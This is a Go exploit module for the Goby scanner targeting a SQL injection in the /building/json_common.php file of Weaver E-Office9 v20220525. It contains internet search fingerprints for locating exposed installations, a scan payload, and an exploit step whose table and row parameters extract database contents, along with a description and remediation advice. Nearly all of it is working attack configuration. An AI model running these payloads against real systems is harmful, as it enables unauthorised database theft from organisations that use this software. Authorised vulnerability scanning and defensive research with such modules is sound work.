package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Weaver E-Office9 v20220525  json_common.php SQL Injection Vulnerability",
    "Description": "<p>Weaver E-Office9 is an online office system of Shanghai Weaver Network Technology Co., Ltd.</p><p>The latest version of Weaver E-Office9 v20220525 has a SQL injection vulnerability in the /building/json_common.php file, which allows attackers to obtain all data in the database.</p>",
    "Product": "Weaver-EOffice",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2022-08-04",
    "Author": "qiushui_sir@163.com",
    "FofaQuery": " ((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\" ",
    "GobyQuery": " ((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\" ",
    "Level": "2",
    "Impact": "<p>The latest version of Weaver E-Office9 v20220525 has a SQL injection vulnerability in the /building/json_common.php file, which allows attackers to obtain all data in the database.</p>",
    "Recommendation": "<p>1. The official has not fixed the vulnerability yet, please contact the manufacturer to fix the vulnerability</p><p>2. Deploy a Web application firewall to monitor database operations.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "table",
            "type": "input",
            "value": "user",
            "show": ""
        },
        {
            "name": "list",
            "type": "input",
            "value": "0",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/building/json_common.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "tfs=user%60#|0|1=1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "admin",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/building/json_common.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "tfs={{{table}}}%60#|{{{list}}}|1=1#"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "OR",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\w\\W]+)"
            ]
        }
    ],
    "Tags": [
        "SQL Injection",
        "Information technology application innovation industry"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "泛微E-Office9 v20220525 json_common.php SQL注入漏洞",
            "Product": "泛微-EOffice",
            "Description": "<p>泛微E-Office9是上海泛微网络科技股份有限公司的一套在线办公系统。</p><p>泛微E-Office9的最新版本v20220525的/building/json_common.php文件存在SQL注入漏洞，攻击者可通该漏洞获取数据库的所有数据。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞</p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>泛微E-Office9的最新版本v20220525的/building/json_common.php文件存在SQL注入漏洞，攻击者可通该漏洞获取数据库的所有数据。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "信创"
            ]
        },
        "EN": {
            "Name": "Weaver E-Office9 v20220525  json_common.php SQL Injection Vulnerability",
            "Product": "Weaver-EOffice",
            "Description": "<p>Weaver E-Office9 is an online office system of Shanghai Weaver Network Technology Co., Ltd.</p><p>The latest version of Weaver E-Office9 v20220525 has a SQL injection vulnerability in the /building/json_common.php file, which allows attackers to obtain all data in the database.</p>",
            "Recommendation": "<p>1. The official has not fixed the vulnerability yet, please contact the manufacturer to fix the vulnerability</p><p>2. Deploy a Web application firewall to monitor database operations.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
            "Impact": "<p>The latest version of Weaver E-Office9 v20220525 has a SQL injection vulnerability in the /building/json_common.php file, which allows attackers to obtain all data in the database.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "Information technology application innovation industry"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-07-22",
    "PocId": "10967"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
